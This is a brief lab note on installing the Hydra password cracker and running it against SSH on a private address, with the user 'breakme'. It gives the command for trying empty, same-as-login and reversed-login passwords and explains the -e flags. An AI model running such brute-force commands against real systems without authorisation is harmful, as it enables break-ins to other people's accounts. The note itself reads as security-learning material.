#### installation

```
sudo dnf install hydra
```

***

#### bruteforce trivial ssh passwords

bruteforce passwords that are the same or the reverse of the login name, or null:
```
hydra -l breakme -e nsr 192.168.2.172 ssh
```
Password was cracked in 3 tries, but it was the same as the username.

**but it doesnt work when the password is not the same as the username...**

The "-e" option has three parameters:

```
s - try the login as password
n - try an empty password
r - reverse the login and try it as password
```

***
